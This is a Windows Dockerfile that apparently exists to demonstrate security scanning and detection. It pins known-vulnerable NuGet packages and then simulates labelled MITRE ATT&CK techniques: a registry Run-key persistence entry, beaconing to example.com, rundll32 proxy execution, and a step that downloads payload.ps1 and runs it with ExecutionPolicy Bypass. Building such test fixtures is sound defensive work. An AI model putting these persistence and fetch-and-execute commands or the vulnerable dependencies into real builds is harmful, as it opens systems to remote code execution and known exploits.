# Stage 1: Build and introduce vulnerable dependencies
FROM mcr.microsoft.com/dotnet/sdk:6.0-windowsservercore-ltsc2022 AS build

WORKDIR /app

# Copy only necessary files first for better caching
COPY WindowsAgent.csproj ./
RUN dotnet restore

# Intentionally include outdated/vulnerable NuGet packages for Software Composition Analysis demonstration
RUN dotnet add package Newtonsoft.Json --version 10.0.3  # Known vulnerable JSON package
RUN dotnet add package System.Net.Http --version 4.3.0   # Older vulnerable Http client package

# Copy remaining files
COPY . ./
RUN dotnet publish WindowsAgent.csproj -c Release -o out

# Stage 2: Runtime with malicious behaviors and TTP simulations
FROM mcr.microsoft.com/dotnet/runtime:6.0-windowsservercore-ltsc2022
WORKDIR /app

COPY --from=build /app/out ./

# Malicious Activity Simulation
# Inject registry persistence (T1547 - Boot or Logon Autostart Execution)
RUN powershell.exe -Command "\
  New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' \
  -Name 'MaliciousAgentUpdater' -Value 'C:\\app\\WindowsAgent.exe' -Force"

# Simulate beaconing (T1071 - Application Layer Protocol)
RUN powershell.exe -Command "\
  Invoke-WebRequest -Uri 'http://example.com/beacon?id=agent' -Method GET"

# Execute code via system binary proxy (T1218 - Signed Binary Proxy Execution)
RUN powershell.exe -Command "\
  Start-Process rundll32.exe -ArgumentList 'C:\\Windows\\System32\\shell32.dll,Control_RunDLL'"

# Emulate command interpreter usage (T1059 - Command and Scripting Interpreter)
RUN powershell.exe -Command "\
  Invoke-WebRequest -Uri 'http://example.com/payload.ps1' -OutFile 'C:\\temp\\payload.ps1'; \
  powershell.exe -ExecutionPolicy Bypass -File 'C:\\temp\\payload.ps1'"

ENTRYPOINT ["WindowsAgent.exe"]